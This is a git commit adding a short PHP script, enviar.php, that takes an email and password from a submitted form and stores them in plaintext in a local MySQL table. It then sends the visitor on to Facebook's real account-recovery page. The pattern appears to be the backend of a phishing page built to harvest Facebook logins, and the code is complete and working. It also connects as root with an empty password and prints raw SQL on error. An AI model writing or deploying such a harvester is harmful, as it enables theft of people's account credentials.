ed2078b17223bc1ee4efd581fa1e63ac91ef6b41
carlos11alda <aldahirgreff22@gmail.com>
2024-07-23 08:02:42 -0500

    Add files via upload

---
+++ enviar.php
@@ -0,0 +1,38 @@
+<?php
+
+// Datos de la base de datos
+$servername = "localhost";
+$username = "root";
+$password = "";
+$dbname = "login";
+
+// Crear conexión
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Verificar conexión
+if ($conn->connect_error) {
+    die("Conexión fallida: " . $conn->connect_error);
+}
+
+// Obtener datos del formulario
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+// Protegerse contra inyección SQL
+$email = $conn->real_escape_string($email);
+$password = $conn->real_escape_string($password);
+
+// Insertar datos en la base de datos
+$sql = "INSERT INTO usuarios (email, password) VALUES ('$email', '$password')";
+
+if ($conn->query($sql) === TRUE) {
+    // Redirigir al enlace especificado
+    header("Location: https://www.facebook.com/recover/account/");
+    exit();
+} else {
+    echo "Error: " . $sql . "<br>" . $conn->error;
+}
+
+// Cerrar conexión
+$conn->close();
+?>
